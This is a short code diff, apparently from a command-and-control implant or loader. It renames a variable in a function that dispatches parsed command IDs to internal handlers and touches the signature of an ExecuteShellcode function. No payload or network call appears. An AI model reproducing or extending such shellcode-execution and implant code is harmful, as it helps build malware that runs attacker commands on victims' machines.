@@ -269,7 +269,7 @@ namespace Memory {
         BOOL ExecuteCommand(_parser &parser) {
 
             _command    cmd         = { };
-            uintptr_t   address     = { };
+            uintptr_t   command     = { };
 
             const auto  cmd_id      = Parser::UnpackDword(&parser);
             bool        success     = true;
@@ -278,16 +278,16 @@ namespace Memory {
                 goto defer;
             }
 
-            x_assertb(address = Memory::Methods::GetInternalAddress(cmd_id));
+            x_assertb(command = Memory::Methods::GetInternalAddress(cmd_id));
 
-            cmd = (_command) RVA(PBYTE, Ctx->base.address, address);
+            cmd = (_command) RVA(PBYTE, Ctx->base.address, command);
             cmd(&parser);
 
         defer:
             return success;
         }
 
-        BOOL ExecuteShellcode(const _parser& parser) {
+        BOOL ExecuteShellcode(const _parser &parser) {
 
             void    (*exec)()   = { };
             void    *address    = { };
